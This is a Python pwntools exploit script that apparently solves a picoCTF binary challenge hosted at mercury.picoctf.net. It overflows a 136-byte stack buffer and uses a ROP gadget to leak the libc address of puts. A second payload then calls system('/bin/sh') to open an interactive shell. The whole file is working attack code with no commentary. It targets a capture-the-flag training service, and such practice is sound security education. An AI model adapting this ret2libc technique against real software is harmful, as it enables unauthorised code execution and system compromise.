#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(
                r,
                """
                b main
                c
                """,
            )
    else:
        r = remote("mercury.picoctf.net", 49464)

    return r


def main():
    r = conn()
    # print(libc.address)

    system_offset = libc.sym["system"]
    binsh_offset = next(libc.search(b"/bin/sh"))

    pop_rdi = 0x0000000000400913
    ret = 0x000000000040052E

    payload = b"A" * 136
    payload += p64(pop_rdi)
    payload += p64(exe.got["puts"])
    payload += p64(exe.plt["puts"])
    payload += p64(exe.symbols["main"])

    r.recvline()
    r.sendline(payload)

    r.recvline()
    leak = r.recvline().strip()
    r.recvline()

    leak = u64(leak.ljust(8, b"\x00"))
    libc.address = leak - libc.sym["puts"]

    payload = b"A" * 136
    payload += p64(pop_rdi)
    payload += p64(libc.address + binsh_offset)
    payload += p64(ret)
    payload += p64(libc.address + system_offset)

    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
